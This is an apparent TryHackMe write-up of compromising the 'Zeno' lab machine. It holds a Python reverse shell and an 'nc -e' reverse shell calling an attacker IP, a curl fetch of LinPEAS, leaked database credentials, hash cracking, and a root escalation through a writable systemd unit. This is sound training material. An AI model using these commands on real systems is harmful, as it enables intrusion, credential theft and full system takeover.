# TryHackMe
------------------------------------
### IP: 10.10.97.171
### Name: Zeno
### Difficulty: Medium
--------------------------------------------

![zeno_profile.jpeg](../assets/zeno_assets/zeno_profile.jpeg)

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Zeno]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.10.231.208
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-14 08:58 CDT
Nmap scan report for 10.10.231.208
Host is up (0.12s latency).
Not shown: 65516 filtered tcp ports (no-response), 17 filtered tcp ports (host-prohibited)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
|_  256 1498e3847055e6600cc20977f8b7a61c (ED25519)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.79 seconds
```

Looking at the page on port 12340 we get a 404 Not found error:

zeno_site.png

Scanning for directories we find several `/rms` directories. 

zeno_dirs.png

Heading to http://10.10.231.208:12340/rms/ we find a site for Pathfinder Hotel, which appears to be running something called Restaurant Management System:

zeno_rms.png

Looking for rms exploits I find https://www.exploit-db.com/exploits/47520

### Exploitation

This script needed some cleaning up and editing, but ultimately allowed us to upload a webshell we could use to get command execution:

```
┌──(ryan㉿kali)-[~/THM/Zeno]
└─$ python rms_rce.py http://10.10.231.208:12340/rms/

    _  _   _____  __  __  _____   ______            _       _ _
  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
 |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
 |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|



Credits : All InfoSec (Raja Ji's) Group
[+] Restaurant Management System Exploit, Uploading Shell
[+] Shell Uploaded. Please check the URL :http://10.10.231.208:12340/rms/images/reverse-shell.php
```

We could then navigate to http://10.10.231.208:12340/rms/images/reverse-shell.php?cmd=id to execute commands:

zeno_cmd.png

Heading to revshell.com I URL encode a Python reverse shell one liner and issue it with:

```
http://10.10.231.208:12340/rms/images/reverse-shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.6.72.91%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

This catches me a callback in my listener:

```
┌──(ryan㉿kali)-[~/THM/Zeno]
└─$ nc -lnvp 443                  
listening on [any] 443 ...
connect to [10.6.72.91] from (UNKNOWN) [10.10.231.208] 38850
bash-4.2$ whoami
whoami
apache
bash-4.2$ hostname
hostname
zeno
```

Trying to grab the user.txt flag in edward's home directory we get a permission denied:

```
bash-4.2$ cat user.txt
cat: user.txt: Permission denied
bash-4.2$ whoami
apache
```

Poking around more I find a config.php file with DB credentials:

```
bash-4.2$ cd connection/
bash-4.2$ ls
config.php
bash-4.2$ cat config.php
<?php
    define('DB_HOST', 'localhost');
    define('DB_USER', 'root');
    define('DB_PASSWORD', 'veerUffIrangUfcubyig');
    define('DB_DATABASE', 'dbrms');
    define('APP_NAME', 'Pathfinder Hotel');
    error_reporting(1);
?>
bash-4.2$ pwd
/var/www/html/rms/connection
```

After trying an easy win with password reuse by root or edward, I logged into the dv and found some password hashes:

```
bash-4.2$ su root
Password: 
su: Authentication failure
bash-4.2$ su edward
Password: 
su: Authentication failure
bash-4.2$ mysql -u root -pveerUffIrangUfcubyig
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9
Server version: 5.5.68-MariaDB MariaDB Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dbrms              |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.01 sec)

MariaDB [(none)]> use dbrms;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [dbrms]> show tables;
+----------------------+
| Tables_in_dbrms      |
+----------------------+
| billing_details      |
| cart_details         |
| categories           |
| currencies           |
| food_details         |
| members              |
| messages             |
| orders_details       |
| partyhalls           |
| pizza_admin          |
| polls_details        |
| quantities           |
| questions            |
| ratings              |
| reservations_details |
| specials             |
| staff                |
| tables               |
| timezones            |
| users                |
+----------------------+
20 rows in set (0.00 sec)

MariaDB [dbrms]> select * from users;
Empty set (0.00 sec)

MariaDB [dbrms]> select * from members;
+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
| member_id | firstname | lastname | login                    | passwd                           | question_id | answer                           |
+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
|        15 | Stephen   | Omolewa  | omolewastephen@gmail.com | 81dc9bdb52d04dc20036dbd8313ed055 |           9 | 51977f38bb3afdf634dd8162c7a33691 |
|        16 | John      | Smith    | jsmith@sample.com        | 1254737c076cf867dc53d60a0364f38e |           8 | 9f2780ee8346cc83b212ff038fcdb45a |
|        17 | edward    | zeno     | edward@zeno.com          | 6f72ea079fd65aff33a67a3f3618b89c |           8 | 6f72ea079fd65aff33a67a3f3618b89c |
+-----------+-----------+----------+--------------------------+----------------------------------+-------------+----------------------------------+
3 rows in set (0.00 sec)
```

I can load these MD5 hashes into a file and try cracking them with Hashcat:

```
                                                                                                                             
┌──(ryan㉿kali)-[~/THM/Zeno]
└─$ hashcat hashes /usr/share/wordlists/rockyou.txt -m 0                 
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

81dc9bdb52d04dc20036dbd8313ed055:1234                     
1254737c076cf867dc53d60a0364f38e:jsmith123 
```

Ok it cracked the first two, but I was really hoping to crack the third one that belonged to Edward. Stephen and John don't appear to be accounts on the box:

```
bash-4.2$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
edward:x:1000:1000::/home/edward:/bin/bash
```
I decided to transfer over LinPEAS to help enumerate further:

```
bash-4.2$ cd /tmp 
bash-4.2$ wget 10.6.72.91/linpeas_NEW.sh  
bash: wget: command not found
bash-4.2$ curl 10.6.72.91/linpeas_NEW.sh > lp.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  828k  100  828k    0     0   793k      0  0:00:01  0:00:01 --:--:--  793k
bash-4.2$ ls
lp.sh
bash-4.2$ chmod +x lp.sh
bash-4.2$ ./lp.sh
```

Linpeas finds that `/etc/systemd/system/zeno-monitoring.service` is writable, as well as some new credentials.

zeno_lp.png

zeno_lp3.png

This is interesting, especially as it's owned by root:

```
bash-4.2$ ls -la /etc/systemd/system/zeno-monitoring.service
-rw-rw-rw-. 1 root root 141 Sep 21  2021 /etc/systemd/system/zeno-monitoring.service
```

I can use the new password to `su edward`

```
bash-4.2$ su edward
Password: 
[edward@zeno tmp]$ whoami
edward
```

Lets go ahead and grab that user flag in Edward's home directory:

zeno_user_flag.png

### Privilege Escalation

I decided to use Edward's credential to SSH in for some persistence in case I lost my shell.

Seeing what edward can perform as root we see he can `sudo reboot`

```
[edward@zeno tmp]$ sudo -l
Matching Defaults entries for edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```

This confirms that the writable service file is the escalation path.

Lets overwrite ExecStart in /etc/systemd/system/zeno-monitoring.service to include a reverse shell, reboot the system and catch a shell bask as root:


```
┌──(ryan㉿kali)-[~/THM/Zeno]
└─$ ssh edward@10.10.231.208
edward@10.10.231.208's password: 
Last login: Fri Jun 14 17:26:09 2024 from ip-10-6-72-91.eu-west-1.compute.internal
[edward@zeno ~]$ vi /etc/systemd/system/zeno-monitoring.service
[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "nc -e /bin/bash 10.6.72.91 443"		

[Install]
WantedBy=multi-user.target
```

Then with a listener going, we should be able to execute `sudo /usr/sbin/reboot`. This will kill our shell, but we will catch a new one in our listener as root.

But for some reason a shell never came back. I'm wondering if we may be dealing with some outbound firewall rules? 

Lets try something else. Lets set the SUID bit on `/bin/bash`, reboot and then try running `/bin/bash -p` for a root shell.


```
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/chmod 4755 /bin/bash                    


[Install]
WantedBy=multi-user.target
```

Updating and then rebooting:
```
┌──(ryan㉿kali)-[~/THM/Zeno]
└─$ ssh edward@10.10.231.208
edward@10.10.231.208's password: 
Last login: Fri Jun 14 17:29:54 2024 from ip-10-6-72-91.eu-west-1.compute.internal
[edward@zeno ~]$ vi /etc/systemd/system/zeno-monitoring.service
[edward@zeno ~]$ sudo /usr/sbin/reboot
Connection to 10.10.231.208 closed by remote host.
Connection to 10.10.231.208 closed.
```

Then after a minute or two:

```
┌──(ryan㉿kali)-[~/THM/Zeno]
└─$ ssh edward@10.10.231.208
edward@10.10.231.208's password: 
Last login: Fri Jun 14 17:37:19 2024 from ip-10-6-72-91.eu-west-1.compute.internal
-bash-4.2$ whoami
edward
-bash-4.2$ /bin/bash -p
bash-4.2# whoami
root
```

Nice, that worked, lets grab the final flag:

zeno_root_flag.png

Thanks for following along!

-Ryan

----------------------------------------
